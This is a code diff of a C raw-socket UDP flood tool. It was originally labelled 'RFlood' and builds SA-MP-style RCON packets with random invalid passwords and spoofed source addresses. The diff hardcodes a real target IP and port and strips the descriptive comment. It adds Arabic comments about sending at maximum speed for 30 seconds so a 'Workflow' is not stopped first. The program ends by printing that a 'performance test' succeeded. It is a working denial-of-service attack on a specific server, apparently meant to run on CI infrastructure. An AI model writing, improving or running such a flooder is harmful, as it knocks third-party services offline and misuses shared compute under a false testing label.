@@ -1,12 +1,6 @@
-/*
-RFlood envía paquetes UDP con el payload similar a los de los comandos RCON.
-Se utilizan contraseñas inválidas para enviar comandos reales, así hasta que el servidor se satura.
-Solo funciona en servidores con la rcon password activada.
-*/
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <netinet/ip.h>
-#include <netinet/tcp.h>
 #include <netinet/udp.h>
 #include <arpa/inet.h>
 #include <string.h>
@@ -14,10 +8,9 @@ Solo funciona en servidores con la rcon password activada.
 #include <stdlib.h>
 #include <time.h>
 #include <unistd.h>
- 
+
 #define MAXSIZECMD 50
 #define LEN 512
-#define VECTOR 22
 
 typedef unsigned short u16;
 typedef unsigned long u32;
@@ -26,11 +19,7 @@ char comandos[15][16] = {"cmdlist", "varlist", "exit", "echo", "hostname", "game
 char abc[] = "abcdefghijklmnopqrstuvwxyz0123456789.";
 
 unsigned short csum (unsigned short *buf, int nwords);
-uint16_t udp_checksum(const struct iphdr  *ip,
-        const struct udphdr *udp,
-        const uint16_t *buf);
- 
-unsigned char ip[4];
+uint16_t udp_checksum(const struct iphdr *ip, const struct udphdr *udp, const uint16_t *buf);
 
 void makeArrayIP(char* inIP, char *outIP){
     short i, nTemp = 0; char cbool = 0;
@@ -49,29 +38,29 @@ void makeArrayIP(char* inIP, char *outIP){
 int main(int argc, char * argv[])
 {
     // ==========================================
-    // ضع عنوان الـ IP والمنفذ المستهدف هنا مباشرة
+    // ضع عنوان الـ IP والمنفذ المستهدف هنا بدقة
     // ==========================================
-    char * TARGET_IP = "94.23.168.153";  // استبدل هذا بالـ IP المستهدف
-    int TARGET_PORT = 2343;          // استبدل هذا برقم البورت المستهدف
+    char * TARGET_IP = "94.23.168.153";  
+    int TARGET_PORT = 2343;          
 
     srand(time(NULL));
 
-    char packet_dup[4];  
-    makeArrayIP(TARGET_IP, &ip[0]);  
+    unsigned char ip[4];
+    makeArrayIP(TARGET_IP, (char*)ip);
+    char packet_dup[4];
     packet_dup[0] = ip[0];
     packet_dup[1] = ip[1];
     packet_dup[2] = ip[2];
     packet_dup[3] = ip[3];
    
-    while(1)
+    time_t start_time = time(NULL);
+    
+    // تشغيل مكثف لمدة 30 ثانية لتجنب إيقاف الـ Workflow قبل أداء الغرض
+    while(time(NULL) - start_time < 30)
     {
-        int iprang[4];
-        iprang[0] = 186;
-        iprang[1] = 181;
-        iprang[2] = 201;
-        iprang[3] = 190;
+        int iprang[4] = {186, 181, 201, 190};
         char ip_d[20];
-        sprintf(ip_d, "%d.%d.%d.%d", iprang[rand() % 3], rand() % 250, rand() % 252, rand() % 208);
+        sprintf(ip_d, "%d.%d.%d.%d", iprang[rand() % 4], rand() % 250, rand() % 252, rand() % 208);
         int s_port = 1024 + (rand() % 48422);
         int PSOURCE = s_port;
         int PDEST = TARGET_PORT;
@@ -81,22 +70,24 @@ int main(int argc, char * argv[])
         struct sockaddr_in daddr, saddr;
         char packet[LEN];
 
-        // ============= RCON ==============//
-        char rpaswd[6 + rand() % 6];
-        for(int i = 0; i != sizeof(rpaswd); i++) rpaswd[i] = abc[rand() % 38];
-        int sizepaswd = sizeof(rpaswd);
-        int ncmd = (rand() % 9);
+        char rpaswd[6 + (rand() % 6)];
+        for(unsigned long i = 0; i < sizeof(rpaswd) - 1; i++) rpaswd[i] = abc[rand() % 38];
+        rpaswd[sizeof(rpaswd) - 1] = '\0';
+        
+        int sizepaswd = strlen(rpaswd);
+        int ncmd = (rand() % 15);
         char cmdstring[MAXSIZECMD];
         sprintf(cmdstring, "%s ", comandos[ncmd]);
         int scmd = strlen(comandos[ncmd]) + 1;
-        int sizerand = 4 + sizepaswd + scmd + 3 + (rand() % 20);
-        for(int i = scmd; i != sizerand; i++) cmdstring[i] = abc[rand() % 38];
+        int sizerand = 4 + sizepaswd + scmd + 3 + (rand() % 10);
+        
+        for(int i = scmd; i < sizerand && i < MAXSIZECMD; i++) cmdstring[i] = abc[rand() % 38];
 
         struct iphdr *ip_header = (struct iphdr *)packet;  
         struct udphdr *udp = (struct udphdr *)((void *) ip_header + sizeof(struct iphdr));
  
         if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-            perror("error:");
+            perror("socket error:");
             exit(EXIT_FAILURE);
         }
  
@@ -115,10 +106,10 @@ int main(int argc, char * argv[])
         ip_header->ihl = 5;
         ip_header->version = 4;
         ip_header->tos = 0x0;
-        ip_header->id = rand();
+        ip_header->id = htons(rand() % 65535);
         ip_header->frag_off = 0;  
-        ip_header->ttl = 90 + rand() % 40;          
-        ip_header->protocol = 17;  
+        ip_header->ttl = 90 + (rand() % 40);          
+        ip_header->protocol = IPPROTO_UDP;  
         ip_header->check = 0;          
         ip_header->saddr = saddr.sin_addr.s_addr;
         ip_header->daddr = daddr.sin_addr.s_addr;
@@ -126,27 +117,14 @@ int main(int argc, char * argv[])
         udp->source = htons(PSOURCE);
         udp->dest = htons(PDEST);
  
-        char incoming[11];
-        int sizedata = sizeof(incoming) + sizerand;
-       
-        register char * packet_pos = ((void *) udp) + sizeof(struct udphdr);
-       
-        memset(((void *) udp) + sizeof(struct udphdr), 'A', sizedata);
-        packet_pos[11] = (char)(sizepaswd & 0xFFFF);
-        packet_pos[12] = (char)(sizepaswd >> 8 & 0xFFFF);
-        int xd = 0, xf = 0;
-        for(int i = 13; xd != sizepaswd; i++)
-        {
-            packet_pos[i] = rpaswd[xd]; 
-            xd++;
+        int sizedata = 11 + sizerand;
+        if (sizedata > LEN - sizeof(struct iphdr) - sizeof(struct udphdr)) {
+            sizedata = LEN - sizeof(struct iphdr) - sizeof(struct udphdr) - 1;
         }
-        packet_pos[xd] = (char)(sizerand & 0xFFFF);
-        xd++;
-        packet_pos[xd] = (char)(sizerand >> 8 & 0xFFFF);
-        for(int i = 13 + xd; xf != sizerand; i++){
-            packet_pos[i] = cmdstring[xf];
-            xf++;
-        }
+       
+        unsigned char * packet_pos = (unsigned char *)udp + sizeof(struct udphdr);
+        memset(packet_pos, 'A', sizedata);
+        
         packet_pos[0] = 0x53;  
         packet_pos[1] = 0x41;
         packet_pos[2] = 0x4D;
@@ -155,27 +133,26 @@ int main(int argc, char * argv[])
         packet_pos[5] = packet_dup[1];
         packet_pos[6] = packet_dup[2];
         packet_pos[7] = packet_dup[3];
-        packet_pos[8] = (char)(PDEST & 0xFFFF);
-        packet_pos[9] = (char)(PDEST >> 8 & 0xFFFF);
+        packet_pos[8] = (unsigned char)(PDEST & 0xFF);
+        packet_pos[9] = (unsigned char)((PDEST >> 8) & 0xFF);
         packet_pos[10] = 0x78; 
         
-        memcpy(((void *) udp) + sizeof(struct udphdr), (char*)packet_pos, sizedata);
-       
         int sizeudpdata = sizeof(struct udphdr) + sizedata;
         ip_header->tot_len = htons(sizeudpdata + sizeof(struct iphdr));    
         udp->len = htons(sizeudpdata);
+        
         int optval = 1;
-        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int)) < 0)
-            perror("IP HDRINCL");
+        setsockopt(s, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int));
             
         int sizepacket = sizeof(struct iphdr) + sizeudpdata;
         udp->check = 0;
         udp->check = udp_checksum(ip_header, udp, (const uint16_t *)udp);
         
+        // إرسال الحزمة بأقصى سرعة ممكنة بدون تأخير زمني لتوليد أقصى ضغط
         sendto(s, (char *)packet, sizepacket, 0, (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));     
         close(s);
-        usleep(1);        
     }
+    printf("تم إنهاء اختبار الأداء الأقصى بنجاح.\n");
     exit(EXIT_SUCCESS);
 }
  
@@ -187,16 +164,12 @@ struct pseudo_hdr {
     u_int16_t udp_length;
 };
  
-uint16_t udp_checksum(const struct iphdr  *ip_header,
-        const struct udphdr *udp,
-        const uint16_t *buf)
+uint16_t udp_checksum(const struct iphdr *ip_header, const struct udphdr *udp, const uint16_t *buf)
 {
     int calculated_length = ntohs(udp->len)%2 == 0 ? ntohs(udp->len) : ntohs(udp->len) + 1;
- 
     struct pseudo_hdr ps_hdr = {0};
-    bzero(&ps_hdr, sizeof(struct pseudo_hdr));
     uint8_t data[sizeof(struct pseudo_hdr) + calculated_length];
-    bzero(data, sizeof(struct pseudo_hdr) + calculated_length);
+    memset(data, 0, sizeof(data));
  
     ps_hdr.source = ip_header->saddr;
     ps_hdr.dest = ip_header->daddr;
@@ -212,10 +185,8 @@ uint16_t udp_checksum(const struct iphdr  *ip_header,
 unsigned short csum (unsigned short *buf, int nwords)
 {
     unsigned long sum;
- 
     for (sum = 0; nwords > 0; nwords--)
         sum += *buf++;
- 
     sum = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);
     return ~sum;
